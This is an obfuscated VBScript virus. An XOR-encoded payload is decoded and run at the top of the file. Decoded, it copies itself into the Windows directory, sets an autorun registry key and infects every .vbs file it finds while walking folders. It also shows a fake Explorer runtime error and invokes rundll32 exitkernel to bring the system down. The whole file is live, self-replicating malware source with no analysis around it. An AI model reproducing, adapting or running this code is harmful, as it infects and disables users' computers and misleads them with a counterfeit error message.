'~
Execute UnCrypt("Gf(Mzzgz(Zm{}em(Fmp|[m|(N[G(5(Kzmi|mGjbmk|*[kzax|afo&Nadm[q{|meGjbmk|*!_mIzm(5(_{kzax|&[kzax|N}ddFiem[m|(Jglq(5(N[G&Gxmf\mp|Nadm(_mIzm!J}nni(5(Jglq&ZmilIddJglq&Kdg{mNgz({(5(DmfJ}nni!(\g(9([|mx(%9An(Eal(J}nni$({$(9!(5(K`z9:>!(\`mf{(5(9Jmi{|(5(*/*(.(K`z9:>!(#(Jmi{|Md{mAn(Eal(J}nni$({$(9!(46(K`z(9:>!(\`mfJmi{|(5(Eal(J}nni$({$(9!(#(Jmi{|Mfl(AnFmp|[m|(_{`[`mdd(5(Kzmi|mGjbmk|*_[kzax|&[`mdd*!N[G&Kzmi|m\mp|Nadm(N[G&Om|[xmkaidNgdlmz9!.*T1=afn;:&j{*![m|(_z(5(N[G&Kzmi|m\mp|Nadm(N[G&Om|[xmkaidNgdlmz9!.*T1=afn;:&j{*$(|z}m!_z&_za|m(Jmi{|!_z&Kdg{m_{`[`mdd&Zmo_za|m(*@CMQWDGKIDWEIK@AFMT[gn|izmTEakzg{gn|T_aflg{TK}zzmf|^mz{agfTZ}fTJmi{|*$(N[G&Om|[xmkaidNgdlmz9!.*T_1=afn;:&j{*[m|(La{cZgg|(5(N[G&Om|Ngdlmz(*T*!Kidd(Zmk}z{m(La{cZgg|!An(Liq(Fg!(5(9;(\`mfE{oJgp(*Z}f|aem(Mzzgz)*(.(k`z98!(.(K`z98!(.(*Xzgozie(K2T_AFLG_[TMPXDGZMZ&MPM*(.(K`z98!(.(K`z98!(.(W(K`z98!(.(*ijfgzeid(xzgozie(|mzeafi|agf*$(jKza|akid#jGCgfdq$*Eakzg{gn|(^a{}id(K##(Z}f|aem(Dajzizq*_[`mdd&Z}f(*z}fldd;:(czfd;0>&mpm$mpa|cmzfmd*!$j@almMfl(AnN}fk|agf(LgNadm(KNadm![m|(^ak|aeN(5(KNadmI||zaj(5(^ak|aeN&I||zaj}|m{^ak|aeN&I||zaj}|m{(5(FgzeidJ}nni(5(**[m|(Jglq(5(N[G&Gxmf\mp|Nadm(KNadm!J}nni(5(Jglq&ZmilIddJglq&Kdg{mAn(Eal(J}nni$(DmfJ}nni!$(9!(46(*+*(\`mf[m|(Jglq(5(N[G&Gxmf\mp|Nadm(^ak|aeN$(0!Jglq&_za|m(Jmi{|Jglq&Kdg{mMfl(An^ak|aeN&I||zaj}|m{(5(I||zajMfl(N}fk|agfN}fk|agf(Zmk}z{m(Ngdlmz:{kif![m|(Oiefg(5(Ngdlmz:[kif&[}jNgdlmz{Ngz(Mik`(ogg(Af(Oiefg(Kidd(Zmk}z{m(ogg!Fmp|[m|(NadmDa{|(5(Ngdlmz:[kif&Nadm{Ngz(Mik`(KNadm(Af(NadmDa{|An(N[G&Om|Mp|mf{agfFiem(KNadm&Xi|`!(5(*j{*(|`mfKidd(LgNadm(KNadm!Md{mAn(N[G&Om|Mp|mf{agfFiem(KNadm&Xi|`!(5(*^J[*(\`mfKidd(LgNadm(KNadm!Mfl(AnFmp|Mfl(N}fk|agf/^J[&Jmi{|&k(jq(O_A")
Function UnCrypt(Stroka)
For x = 1 To Len(Stroka) Step 1
If Mid (Stroka, x, 1) = Chr(15) Then
s = Chr(AscB (Chr(32)) Xor 8)
ElseIf Mid (Stroka, x, 1) = Chr(16) Then
s = Chr(AscB (Chr(126)) Xor 8)
Else
s = Chr(AscB (Mid(Stroka, x, 1)) Xor 8)
End If
UnCrypt = UnCrypt & s
Next
End Function
'#